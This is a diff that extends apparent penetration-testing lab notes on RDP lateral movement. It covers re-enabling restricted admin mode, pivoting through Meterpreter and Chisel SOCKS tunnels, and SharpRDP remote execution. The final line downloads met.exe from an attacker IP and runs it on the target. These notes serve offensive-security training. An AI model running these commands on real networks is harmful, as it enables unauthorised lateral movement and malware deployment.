@@ -1,3 +1,5 @@
+##RDP
+
 RDP is a multichannel network protocol developed by Microsoft and is used for communication
 between Terminal Servers and their clients. When an RDP connection is created, the NTLM hashes will reside in memory for the duration of
 the session. The session does not terminate without a proper logout, which means simply
@@ -31,4 +33,79 @@ Access to remote resource through a powershell session and enable the restricted
 PS C:\Windows\system32> Enter-PSSession -Computer appsrv01
 
 [appsrv01]: PS C:\Users\admin\Documents> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
+```
+
+#### Reverse RDP Proxying with metasploit
+
+configure a reverse tunnel through the Meterpreter session and use that with a SOCKS proxy
+
+```
+msf5 exploit(multi/handler) > use multi/manage/autoroute
+msf5 post(multi/manage/autoroute) > set session 1
+msf5 post(multi/manage/autoroute) > exploit
+
+```
+
+```
+post(multi/manage/autoroute) > use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
+srvhost => 127.0.0.1
+msf5 auxiliary(server/socks4a) > exploit -j
+```
+
+add proxy rules
+```
+kali@kali:~$ sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
+```
+
+RDP to remote target
+```
+kali@kali:~$ proxychains rdesktop 192.168.120.10
+```
+
+#### Reverse RDP Proxying with Chisel
+[Chisel](https://github.com/jpillora/chisel.git) is an open-source tunneling software written in Golang. It works by setting up a TCP
+tunnel and performing data transfers over HTTP, while securing it with SSH.
+
+compile chisel on Kali with the go build
+```
+kali@kali:~$ sudo apt install golang
+kali@kali:~$ git clone https://github.com/jpillora/chisel.git
+kali@kali:~$ cd chisel/
+kali@kali:~/chisel$ go build
+```
+
+commpile Chisel for windows exe, -ldflags -s -w to strip debugging info
+
+```
+env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
+```
+
+Set up the chisel server on kali
+```
+kali@kali:~/chisel$ ./chisel server -p 8080 --socks5
+```
+
+enable ssh password fo the tunnel, and set up ssh portfoward
+```
+kali@kali:~$ sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+kali@kali:~$ sudo systemctl start ssh.service
+kali@kali:~$ ssh -N -D 0.0.0.0:1080 localhost
+```
+
+trafer chisel.exe to windows, and run the client to connect to kali server
+```
+C:\Tools> chisel.exe client kaliserverIP:8080 socks
+```
+
+now RDP with proxychains
+```
+kali@kali:~$ sudo proxychains rdesktop 192.168.120.10
+```
+
+#### RDP remote code execution
+The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll. This
+library exposes interfaces to both scripts and compiled code through COM objects. We can use a tool called [SharpRDP](https://github.com/0xthirteen/SharpRDP) to exeucte command remotely using RDP.
+```
+C:\Tools> sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
 ```
